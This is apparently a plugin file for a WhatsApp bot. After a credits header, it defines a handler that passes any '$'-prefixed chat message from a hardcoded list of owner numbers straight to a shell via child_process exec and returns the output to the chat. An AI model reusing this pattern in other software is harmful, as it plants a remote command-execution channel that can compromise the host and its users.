/*╭━━━〔 CREDITS FOR 𝙎𝙃𝘼𝙉𝙆𝙎〕━━━╮
│ 👑 الـمـطـور ↜ 𝙎𝙃𝘼𝙉𝙆𝙎
│ 🌾 قــنــاة الــمــطـور ↜https://whatsapp.com/channel/0029VbC5LLx6GcGDXZUmHP0y
 📜 𝙏𝙝𝙞𝙨 𝙞𝙨 𝙩𝙝𝙚 𝙍𝙀𝙋𝙊 𝙡𝙞𝙣𝙠 𝙬𝙞𝙩𝙝 𝙖𝙡𝙡 𝙩𝙝𝙚 𝙘𝙤𝙙𝙚𝙨:
⚡ https://github.com/SHANKS-CODE-1/CODE
الوظيفه: تحميل المكاتب و حجات تانيه الخ.....
╰━━━━━━━━━━━━━━━━━━╯
*/

import cp, {exec as _exec} from 'child_process';
import {promisify} from 'util';
const exec = promisify(_exec).bind(cp);
const handler = async (m, {conn, isOwner, command, text, usedPrefix, args, isROwner}) => {
const devs = ['2010*******@s.whatsapp.net','20109******@s.whatsapp.net','9665******@s.whatsapp.net']
if (!devs.includes(m.sender)) return

  if (global.conn.user.jid != conn.user.jid) return;
  m.reply('*[❗] جاري التنفيذ...*');
  let o;
  try {
    o = await exec(command.trimStart() + ' ' + (text || '').trim());
  } catch (e) {
    o = e;
  } finally {
    const {stdout, stderr} = o;
    if (stdout.trim()) m.reply(stdout);
    if (stderr.trim()) m.reply(stderr);
  }
};
handler.customPrefix = /^[$]/;
handler.command = new RegExp;
handler.help = ['$ <الأمر>'];
handler.tags = ['owner'];
export default handler;